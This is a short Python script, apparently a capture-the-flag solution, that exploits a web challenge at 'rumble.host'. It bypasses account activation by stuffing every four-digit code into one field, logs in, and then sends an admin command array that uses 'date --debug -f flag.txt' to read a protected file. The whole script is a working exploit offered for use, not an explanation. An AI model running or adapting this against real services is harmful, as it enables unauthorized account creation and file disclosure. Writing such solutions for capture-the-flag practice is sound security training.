import requests


def genActiveCode():
    res = ""
    for x in range(10000):
        res += "{:0>4}".format(x)
    return res


# url = 'http://127.0.0.1:1024'
url = 'http://roberisagangsta.rumble.host'
s = requests.Session()


json = {"action": "create_account", "data": {"email": "to", "password": "to",
                                             "groupid": "999", "userid": "e999", "activation": genActiveCode()}}

r = s.post(url + '/json_api', json=json)

json = {"action": "login", "data": {"email": "to", "password": "to"}}
r = s.post(url + '/json_api', json=json)

r = s.get(url + '/user', proxies={'http': 'http://127.0.0.1:8080'})
print(r.text)

json = {
    "action": "admin",
    "data": {
        "cmd": ["date", "--debug", "-f", "flag.txt"]
    }
}
r = s.get(url + '/admin', json=json, proxies={'http': 'http://127.0.0.1:8080'})
print(r.text)
